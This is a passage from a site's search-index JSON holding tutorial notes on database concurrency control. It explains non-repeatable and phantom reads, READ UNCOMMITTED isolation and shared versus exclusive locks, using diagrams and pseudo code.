\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Real-World Example:</p> <pre><code>Banking Report Transaction:\n\n1. 9:00 AM: Report reads Account A balance: $1000\n2. 9:00 AM: Report reads Account B balance: $2000\n3. 9:01 AM: Another transaction transfers $500 from A to B (COMMITS)\n4. 9:02 AM: Report re-reads Account A balance: $500 \u2190 CHANGED!\n5. 9:02 AM: Report re-reads Account B balance: $2500 \u2190 CHANGED!\n\nReport shows: \n- First reading: A=$1000, B=$2000, Total=$3000\n- Second reading: A=$500, B=$2500, Total=$3000\n\nBut individual account values changed mid-transaction!\nThis could cause errors in complex calculations.\n</code></pre> <p>Pseudo Code Example:</p> <pre><code># Non-Repeatable Read Scenario\n\ndef generate_financial_report(db):\n    \"\"\"Generates a report that requires consistent data\"\"\"\n    db.begin()  # Using READ COMMITTED (allows non-repeatable reads)\n\n    # First read\n    balance1 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 'A'\"\n    ).fetchone()[0]\n    print(f\"First read: Account A = ${balance1}\")  # $1000\n\n    # Some processing...\n    time.sleep(2)\n\n    # Second read (another transaction might have modified data)\n    balance2 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 'A'\"\n    ).fetchone()[0]\n    print(f\"Second read: Account A = ${balance2}\")  # $500 (DIFFERENT!)\n\n    # Calculate something using both reads\n    average = (balance1 + balance2) / 2  # Using inconsistent data!\n    print(f\"Average: ${average}\")  # $750 (meaningless!)\n\n    db.commit()\n\n\n# Concurrent transaction that causes the problem\ndef concurrent_update(db):\n    time.sleep(1)  # Runs between first and second read\n    db.begin()\n    db.execute(\"UPDATE accounts SET balance = 500 WHERE id = 'A'\")\n    db.commit()\n\n\n# Solution: Use REPEATABLE READ isolation\ndef generate_financial_report_safe(db):\n    \"\"\"Safe version with REPEATABLE READ\"\"\"\n    db.set_isolation_level(\"REPEATABLE READ\")\n    db.begin()\n\n    # First read\n    balance1 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 'A'\"\n    ).fetchone()[0]\n    print(f\"First read: ${balance1}\")  # $1000\n\n    time.sleep(2)\n\n    # Second read - SAME value even if others modified it!\n    balance2 = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 'A'\"\n    ).fetchone()[0]\n    print(f\"Second read: ${balance2}\")  # $1000 (SAME!)\n\n    # Consistent calculation\n    average = (balance1 + balance2) / 2\n    print(f\"Average: ${average}\")  # $1000\n\n    db.commit()\n</code></pre> <p>Advantages of Allowing Non-Repeatable Reads: - \u2705 Better concurrency than REPEATABLE READ - \u2705 Reads always see latest committed data - \u2705 Lower lock overhead</p> <p>Disadvantages: - \u274c Inconsistent view within a transaction - \u274c Can't rely on data staying the same - \u274c Problems for reports and analytics</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#23-phantom-read-problem","title":"2.3 Phantom Read Problem","text":"<p>Description:</p> <p>A phantom read occurs when a transaction re-executes a query with a range condition (e.g., WHERE clause) and finds different rows because another transaction inserted or deleted rows that match the condition.</p> <p>Context &amp; Problem:</p> <pre><code>Timeline of Phantom Read:\n\nTime    Transaction 1                    Transaction 2\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nt1      BEGIN TRANSACTION\nt2      SELECT COUNT(*) \n        FROM orders \n        WHERE status = 'pending'\n        \u2192 Returns 10 rows\n                                         BEGIN TRANSACTION\nt3                                       INSERT INTO orders\n                                         (status) VALUES ('pending')\nt4                                       COMMIT\n\nt5      SELECT COUNT(*) \n        FROM orders \n        WHERE status = 'pending'\n        \u2192 Returns 11 rows (NEW ROW!)\n\nt6      COMMIT\n\nProblem: New rows appeared (like phantoms!) between reads\n</code></pre> <p>Visual Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                  PHANTOM READ ANOMALY                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transaction 1              Database          Transaction 2\n\u2502                                                         \u2502\n\u2502  BEGIN                                                  \u2502\n\u2502    \u2502                                                    \u2502\n\u2502    \u251c\u2500 SELECT WHERE age &gt; 25                            \u2502\n\u2502    \u2502    \u2192 Returns [A, B, C]  \u2500\u2500\u2192 [Row A]              \u2502\n\u2502    \u2502      (3 rows)               [Row B]              \u2502\n\u2502    \u2502                              [Row C]              \u2502\n\u2502    \u2502                                 \u2502                 \u2502\n\u2502    \u2502                                 \u2502      BEGIN      \u2502\n\u2502    \u2502                                 \u2502        \u2502        \u2502\n\u2502    \u2502                              [Row D] \u2190\u2500\u2500 INSERT   \u2502\n\u2502    \u2502                           (age=30, NEW!)  \u2502       \u2502\n\u2502    \u2502                                 \u2502      COMMIT     \u2502\n\u2502    \u2502                                 \u2502                 \u2502\n\u2502    \u251c\u2500 SELECT WHERE age &gt; 25                            \u2502\n\u2502    \u2502    \u2192 Returns [A, B, C, D] \u2500\u2192 [Row A]             \u2502\n\u2502    \u2502      (4 rows - PHANTOM!)      [Row B]             \u2502\n\u2502    \u2502                              [Row C]              \u2502\n\u2502    \u2502                              [Row D] \u2190 NEW!       \u2502\n\u2502    \u2502                                                    \u2502\n\u2502  COMMIT                                                 \u2502\n\u2502                                                         \u2502\n\u2502  Difference from Non-Repeatable Read:                   \u2502\n\u2502  \u2022 Non-Repeatable: SAME row, DIFFERENT value           \u2502\n\u2502  \u2022 Phantom: DIFFERENT number of rows                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Concrete Example:</p> <pre><code>E-commerce Inventory Transaction:\n\nT1: Admin wants to know total pending orders\n    Query: SELECT COUNT(*) FROM orders WHERE status = 'pending'\n    Result: 100 orders\n\n    ... Admin calculates shipping capacity needed: 100 orders ...\n\nT2: (Meanwhile) Customer places new order\n    INSERT INTO orders (status) VALUES ('pending')\n    COMMIT\n\nT1: Admin re-runs query to verify\n    Query: SELECT COUNT(*) FROM orders WHERE status = 'pending'\n    Result: 101 orders \u2190 PHANTOM!\n\n    Problem: Capacity calculation is now wrong!\n</code></pre> <p>Pseudo Code Example:</p> <pre><code># Phantom Read Scenario\n\ndef calculate_statistics(db):\n    \"\"\"Calculate statistics - affected by phantom reads\"\"\"\n    db.set_isolation_level(\"REPEATABLE READ\")  # Still allows phantoms!\n    db.begin()\n\n    # First query: Count pending orders\n    count1 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    print(f\"First count: {count1} orders\")  # 100 orders\n\n    # Calculate average order value\n    avg1 = db.execute(\n        \"SELECT AVG(total) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    print(f\"First average: ${avg1}\")  # $50.00\n\n    time.sleep(2)  # Another transaction inserts rows\n\n    # Second query: Re-count pending orders\n    count2 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    print(f\"Second count: {count2} orders\")  # 105 orders (PHANTOM!)\n\n    # Recalculate average\n    avg2 = db.execute(\n        \"SELECT AVG(total) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    print(f\"Second average: ${avg2}\")  # $52.30 (CHANGED!)\n\n    # Inconsistent!\n    if count1 != count2:\n        print(\"ERROR: Phantom reads detected!\")\n\n    db.commit()\n\n\n# Concurrent transaction inserting phantom rows\ndef place_orders(db):\n    time.sleep(1)\n    db.begin()\n    # Insert 5 new pending orders (phantoms!)\n    for i in range(5):\n        db.execute(\n            \"INSERT INTO orders (status, total) VALUES ('pending', 60.00)\"\n        )\n    db.commit()\n\n\n# Solution: Use SERIALIZABLE isolation\ndef calculate_statistics_safe(db):\n    \"\"\"Safe version with SERIALIZABLE isolation\"\"\"\n    db.set_isolation_level(\"SERIALIZABLE\")\n    db.begin()\n\n    # First query\n    count1 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    avg1 = db.execute(\n        \"SELECT AVG(total) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n\n    time.sleep(2)\n\n    # Second query - NO PHANTOMS!\n    # Either blocks until other transaction commits,\n    # or other transaction is aborted\n    count2 = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n    avg2 = db.execute(\n        \"SELECT AVG(total) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n\n    # Guaranteed consistent\n    assert count1 == count2\n    assert avg1 == avg2\n\n    db.commit()\n\n\n# Alternative: Use explicit locking\ndef calculate_statistics_with_locks(db):\n    \"\"\"Use explicit range locks\"\"\"\n    db.begin()\n\n    # Lock the range to prevent inserts\n    db.execute(\n        \"SELECT * FROM orders WHERE status = 'pending' FOR UPDATE\"\n    )\n    # Or use table lock\n    db.execute(\"LOCK TABLE orders IN EXCLUSIVE MODE\")\n\n    # Now queries are consistent\n    count = db.execute(\n        \"SELECT COUNT(*) FROM orders WHERE status = 'pending'\"\n    ).fetchone()[0]\n\n    db.commit()\n</code></pre> <p>Comparison: Non-Repeatable vs Phantom Reads:</p> <pre><code># Non-Repeatable Read: SAME row, DIFFERENT value\ndef non_repeatable_example(db):\n    db.begin()\n\n    # Read row with id=1\n    price1 = db.execute(\"SELECT price FROM products WHERE id = 1\").fetchone()\n    # price1 = $100\n\n    # ... another transaction updates this row ...\n\n    # Read SAME row again\n    price2 = db.execute(\"SELECT price FROM products WHERE id = 1\").fetchone()\n    # price2 = $150 (CHANGED!)\n\n    # Same row, different value\n\n\n# Phantom Read: DIFFERENT number of rows\ndef phantom_read_example(db):\n    db.begin()\n\n    # Query with range condition\n    rows1 = db.execute(\"SELECT * FROM products WHERE price &gt; 100\").fetchall()\n    # Returns 10 rows\n\n    # ... another transaction inserts NEW row with price=120 ...\n\n    # Same query again\n    rows2 = db.execute(\"SELECT * FROM products WHERE price &gt; 100\").fetchall()\n    # Returns 11 rows (NEW ROW appeared!)\n\n    # Different number of rows (phantom)\n</code></pre> <p>Advantages of Allowing Phantom Reads: - \u2705 Better performance than SERIALIZABLE - \u2705 Protects individual rows (REPEATABLE READ) - \u2705 Sufficient for many use cases</p> <p>Disadvantages: - \u274c Range queries return inconsistent results - \u274c COUNT, SUM, AVG can change mid-transaction - \u274c Problems for analytics and reporting</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#3-what-are-the-isolation-levels","title":"3. What are the Isolation Levels?","text":"<p>The SQL standard defines four isolation levels that provide different trade-offs between consistency and concurrency:</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#31-read-uncommitted","title":"3.1 Read Uncommitted","text":"<p>Description:</p> <p>The weakest isolation level, also known as \"dirty read\" mode. At this level, transactions operate with minimal isolation - they can read data that has been modified by other transactions but not yet committed. This means a transaction can see \"dirty\" (uncommitted) data that might be rolled back later.</p> <p>Key Characteristics:</p> <ul> <li>No isolation guarantees - transactions can see each other's uncommitted changes</li> <li>Maximum concurrency - no locks interfere with reads or writes</li> <li>Fastest performance - minimal overhead, no waiting</li> <li>Data integrity not guaranteed - can read data that never actually existed in the database</li> <li>Allows all anomalies - dirty reads, non-repeatable reads, phantom reads</li> </ul> <p>Locking Strategy:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502     READ UNCOMMITTED - Locking Strategy                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 READ Operations:                                        \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 NO read locks acquired                   \u2502         \u2502\n\u2502 \u2502 \u2022 Reads NEVER wait for write locks         \u2502         \u2502\n\u2502 \u2502 \u2022 Can read rows being modified             \u2502         \u2502\n\u2502 \u2502 \u2022 Ignores all existing locks               \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 WRITE Operations:                                       \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquires exclusive write locks           \u2502         \u2502\n\u2502 \u2502 \u2022 Holds locks until commit/rollback        \u2502         \u2502\n\u2502 \u2502 \u2022 Blocks other WRITES (not reads)          \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents lost updates                    \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 Lock Compatibility Matrix:                              \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                    \u2502\n\u2502 \u2502            \u2502  Read   \u2502  Write   \u2502                    \u2502\n\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                    \u2502\n\u2502 \u2502 Read       \u2502   \u2713     \u2502    \u2713     \u2502 (no locks!)        \u2502\n\u2502 \u2502 Write      \u2502   \u2713     \u2502    \u2717     \u2502 (write locks)      \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                    \u2502\n\u2502                                                         \u2502\n\u2502 Implementation:                                         \u2502\n\u2502 \u2022 PostgreSQL: SET TRANSACTION ISOLATION LEVEL           \u2502\n\u2502               READ UNCOMMITTED (upgrades to READ        \u2502\n\u2502               COMMITTED - doesn't support true dirty)   \u2502\n\u2502 \u2022 MySQL: Uses \"dirty read\" mode with no read locks      \u2502\n\u2502 \u2022 SQL Server: NOLOCK hint or READ UNCOMMITTED          \u2502\n\u2502 \u2022 Oracle: Not supported (minimum is READ COMMITTED)     \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>How Locking Works (or Doesn't):</p> <pre><code>Scenario: Two transactions accessing same row\n\nT1: UPDATE account SET balance = 500 WHERE id = 1\n    \u2193\n    Acquires EXCLUSIVE WRITE LOCK on row id=1\n    [Row 1: balance=500, WRITE LOCKED by T1]\n    \u2193\n    (not yet committed)\n\nT2: SELECT balance FROM account WHERE id = 1\n    \u2193\n    NO READ LOCK NEEDED\n    Ignores T1's write lock\n    Reads uncommitted value: 500 \u2713 (DIRTY READ!)\n    \u2193\n    No waiting, no blocking\n\nT1: ROLLBACK\n    \u2193\n    [Row 1: balance=1000] (original value restored)\n\nResult: T2 read value (500) that never committed!\n</code></pre> <p>How it Works:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           READ UNCOMMITTED - How it Works               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  \u2022 NO read locks acquired                               \u2502\n\u2502  \u2022 Reads don't block writes                             \u2502\n\u2502  \u2022 Writes don't block reads                             \u2502\n\u2502  \u2022 Can read data being modified by other transactions   \u2502\n\u2502                                                         \u2502\n\u2502  Transaction 1          Database          Transaction 2 \u2502\n\u2502                                                         \u2502\n\u2502  UPDATE x = 10          [x = 10]                        \u2502\n\u2502  (not committed)        (dirty)                         \u2502\n\u2502                            \u2502                            \u2502\n\u2502                            \u2514\u2500\u2500\u2500\u2500\u2192 READ x = 10 \u2713        \u2502\n\u2502                                   (reads dirty data!)   \u2502\n\u2502  ROLLBACK               [x = 5]                         \u2502\n\u2502  (x back to 5)          (original)                      \u2502\n\u2502                                                         \u2502\n\u2502  T2 read wrong value (10 instead of 5)!                 \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Visual Diagram:</p> <pre><code>READ UNCOMMITTED - All Problems Allowed:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 T1: BEGIN                                            \u2502\n\u2502 T1: UPDATE balance = 900                             \u2502\n\u2502     \u2193 (uncommitted)                                  \u2502\n\u2502     [balance = 900] \u2190 DIRTY DATA                     \u2502\n\u2502         \u2193                                            \u2502\n\u2502         \u2514\u2500\u2500\u2192 T2: BEGIN                               \u2502\n\u2502              T2: READ balance = 900 \u2713 (DIRTY READ)   \u2502\n\u2502              T2: Use 900 in calculations             \u2502\n\u2502              T2: COMMIT                              \u2502\n\u2502     \u2193                                                \u2502\n\u2502 T1: ROLLBACK                                         \u2502\n\u2502     [balance = 1000] \u2190 Back to original              \u2502\n\u2502                                                      \u2502\n\u2502 Result: T2 used invalid data!                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nProblems Allowed:\n\u2717 Dirty Read        - YES\n\u2717 Non-Repeatable    - YES\n\u2717 Phantom Read      - YES\n</code></pre> <p>Pseudo Code:</p> <pre><code># READ UNCOMMITTED Example\n\ndef read_uncommitted_transaction(db):\n    \"\"\"Demonstrates READ UNCOMMITTED behavior\"\"\"\n    db.set_isolation_level(\"READ UNCOMMITTED\")\n    db.begin()\n\n    # Can read uncommitted data from other transactions\n    balance = db.execute(\n        \"SELECT balance FROM accounts WHERE id = 1\"\n    ).fetchone()[0]\n\n    # This balance might be:\n    # 1. Uncommitted (dirty)\n    # 2. About to be rolled back\n    # 3. Different if we read again (non-repeatable)\n    # 4. Include phantom rows if using COUNT/SUM\n\n    print(f\"Balance: {balance}\")  # Might be wrong!\n\n    db.commit()\n\n\n# Use Case: Live dashboards (approximations OK)\ndef dashboard_stats(db):\n    \"\"\"Acceptable use of READ UNCOMMITTED\"\"\"\n    db.set_isolation_level(\"READ UNCOMMITTED\")\n    db.begin()\n\n    # Get approximate counts for dashboard\n    # Exactness not critical, performance is\n    total_users = db.execute(\"SELECT COUNT(*) FROM users\").fetchone()[0]\n    total_orders = db.execute(\"SELECT COUNT(*) FROM orders\").fetchone()[0]\n    revenue = db.execute(\"SELECT SUM(total) FROM orders\").fetchone()[0]\n\n    # These are approximate but fast!\n    return {\n        \"users\": total_users,\n        \"orders\": total_orders,\n        \"revenue\": revenue\n    }\n</code></pre> <p>Advantages: - \u2705 Maximum concurrency - no blocking - \u2705 Best performance - no locks acquired - \u2705 No deadlocks - transactions never wait - \u2705 Good for analytics - approximate results acceptable</p> <p>Disadvantages: - \u274c Dirty reads - can read rollback data - \u274c Unreliable data - values may be invalid - \u274c Not suitable for business logic - can cause serious errors - \u274c Data integrity issues - decisions based on wrong data</p> <p>When to Use: - Read-only reporting with approximate results - Monitoring dashboards - Non-critical analytics - High-volume data warehousing</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#24-understanding-locks-shared-vs-exclusive","title":"2.4 Understanding Locks: Shared vs Exclusive","text":"<p>Description:</p> <p>Database locks are the fundamental mechanism used to control concurrent access to data and implement isolation levels. Understanding the two primary types of locks - Shared Locks and Exclusive Locks - is essential to understanding how databases prevent isolation problems and achieve different isolation levels.</p> <p>Lock Types:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502              DATABASE LOCK TYPES                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. SHARED LOCK (S-lock / Read Lock)                    \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquired when reading data               \u2502         \u2502\n\u2502 \u2502 \u2022 Multiple transactions can hold           \u2502         \u2502\n\u2502 \u2502   shared locks on same resource            \u2502         \u2502\n\u2502 \u2502 \u2022 Allows concurrent reads                  \u2502         \u2502\n\u2502 \u2502 \u2022 Prevents modifications while held        \u2502         \u2502\n\u2502 \u2502 \u2022 \"Many readers, no writers\"               \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2502 2. EXCLUSIVE LOCK (X-lock / Write Lock)                \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502 \u2502 \u2022 Acquired when modifying data             \u2502         \u2502\n\u2502 \u2502 \u2022 ONLY ONE transaction can hold            \u2502         \u2502\n\u2502 \u2502   exclusive lock on a resource             \u2502         \u2502\n\u2502 \u2502 \u2022 Blocks ALL other locks (read &amp; write)    \u2502         \u2502\n\u2502 \u2502 \u2022 Ensures isolated modifications           \u2502         \u2502\n\u2502 \u2502 \u2022 \"One writer, no readers\"                 \u2502         \u2502\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         